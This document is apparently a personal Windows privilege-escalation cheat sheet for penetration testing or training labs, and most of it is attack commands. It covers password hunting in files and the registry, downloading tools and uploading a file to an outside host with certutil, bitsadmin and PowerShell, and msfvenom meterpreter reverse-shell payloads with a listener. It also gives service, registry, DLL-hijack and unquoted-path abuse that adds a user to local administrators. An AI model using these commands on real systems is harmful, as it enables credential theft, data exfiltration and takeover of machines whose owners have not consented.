
##### System information :

```bash
#get systeminformation:
systeminfo
systeminfo | find /B /C:"OS Name" /C:"OS Version" /C:"System Type"

#get hostname
hostname

#usint wmic 
wmic qfe #give list of updates 
wmic qfe get Caption,Description,HostFixID,InstalledOn #show specific information
wmic qfe list 
wmic logicaldisk
wmic logicaldisk get caption,description,providername
```


##### User information :

```bash
whoami
whoami /priv
whoami /group

net user
net user <specific username>
net localgroup 
net localgroup <specific username>
```

##### Network information :
```bash
ipconfig
arp -a
route -a
route print
netstat -ano

port forwarding of ports :
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080

```


##### AV information :
```bash
sc query windefend
sc queryex type= service
netsh advfirewall firewall show state
netsh firewall show state
netsh firewall show config
```


##### Password hunting :
```bash
findstr /si password *.txt *.ini *.config #search password in current dir files
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKCU\Software\ORL\WinVNC3\Password"

```



##### File transfer in windows :
```bash
certutil -urlcache -f http://192.168.31.141/ignite.txt ignite.txt
bitsadmin /transfer job http://192.168.31.141/ignite.txt C:\Users\Public\ignite.txt
powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.31.141/ignite.txt', 'ignite.txt')
powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://172.16.1.30/upload.php', 'C:\temp\supersecret.txt')"


impacket-smbserver share $(pwd) -smb2support
		copy \\192.168.31.141\share\ignite.txt
		 copy ignite.txt \\192.168.31.141\share\ignite.txt

using tftp:
use auxiliary/server/tftp
set srvhost 192.168.31.141
set tftproot /root/raj
run
			tftp -i 192.168.31.219 GET ignite.txt


use auxiliary/server/ftp
set srvhost 192.168.31.141
set ftproot /root/raj
set ftpuser raj
set ftppass 123
run
				ftp 192.168.31.141
				dir
				get ignite.txt


python3 -m pyftpdlib -w -p 21 -u ignite -P 123
				ftp 192.168.31.141
				get ignite.txt
				put C:\Users\raj\avni.txt


```




##### windows exploit suggester.py some commands:

```
systeminfo <-- copy output to file
windows-exploit-suggester.py --update
windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt <-- output of systeminfo command
```


##### used this following metasploit module:
```bash
meterpreter > run post/multi/recon/local_exploit_suggester 
```

##### Using Windows Subsystem for Linux (WSL)
```bash
where /R c:\windows bash.exe
where /R c:\windows wsl.exe

wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```


##### RottenPotato (Token Impersonation) :
```bash
getuid
getprivs
use incognito
list\_tokens -u
cd c:\temp\
execute -Hc -f ./rot.exe
impersonate\_token "NT AUTHORITY\SYSTEM"
```

##### Using RunAs: 
```bash
cmdkey /list            <--- check which account credential saved.

C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c
TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt" #it is same as running sudo in linux
```

##### Registry Escalation - Autorun:
transfer autorun64.exe and accesschk64.exe to target machine.
```bash
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
Look is there any .exe file in HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run this is will show in top when autorun64.exe run

C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
According the access whatever the path will show by autorun64.exe
```

##### Registry Escalation - AlwaysinstallElevated:
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

used 'Write-UserAddMSI' command this will runas administrator add persistance user.

msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
setup listner 
execute setup.msi file

```
##### Service Escalation - Registry:
```bash
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fluser belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.

if something show like this >
user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.

open the code below add sysmte(cmd.exe /k net localgroup administrators user /add)

compline it with commands make execute:
x86_64-w64-mingw32-gcc windows_service.c -o x.exe 

1. Place x.exe in ‘C:\Temp’.
2. Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
3. In the command prompt type: sc start regsvc
4. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
```
![[windows_service.c]]



##### Privilege Escalation - Startup Application:
```bash
checkout permission for startup application if we find "F" means bingo.
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

generate virus using msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe

msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.56.101; set LPORT 4444; run"

1. Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.
2. Logoff.
3. Login with the administrator account credentials.

```

##### Privilege Escalation -  DLL Hijacking:
```bash
Windows VM

1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.
3. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.
4. In the input box on the same line type: dllhijackservice.exe
5. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
6. Next, select from the left-most drop down menu ‘Result’.
7. In the input box on the same line type: NAME NOT FOUND
8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
9. Open command prompt and type: sc start dllsvc
10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.

Exploitation

Windows VM

1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_dll.c’ to the Kali VM.

Kali VM

1. Open windows_dll.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
3. Copy the generated file hijackme.dll, to the Windows VM.

Windows VM

1. Place hijackme.dll in ‘C:\Temp’.
2. Open command prompt and type: sc stop dllsvc & sc start dllsvc
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
```


##### Service Escalation - binPath:
```bash

accesschk64.exe -uwcv Everyone * <checking binpath permission everywhere>
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
sc config daclsvc binpath= "net localgroup administrators user /add"
sc start daclsvc
net localgroup administrators

```


##### Service Escalation - Unquoted Service Paths:
```bash
Checkout service called path without quotes "" something like this.
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe

we can place Common.exe file under Unquoted Path Service if ther service started 
it read something like this C:\Program Files\Unquoted Path Service\Common.exe

sc query Common.exe
sc stop Common.exe

do whatever your stuff like generating msfvenom payload Common.exe place at path unquoted 

sc start Common.exe 
```

##### At last used automated scripts if we don't find anything else
```bash
Always used before running any scripts.

powershell -ep bypass
Invoke-Allchecks

Directly run like this:
add "Invoke-Allchecks" in end the script of PowerUP.ps1 script or any other script  
powershell -ep bypass .\PowerUp.ps1
```
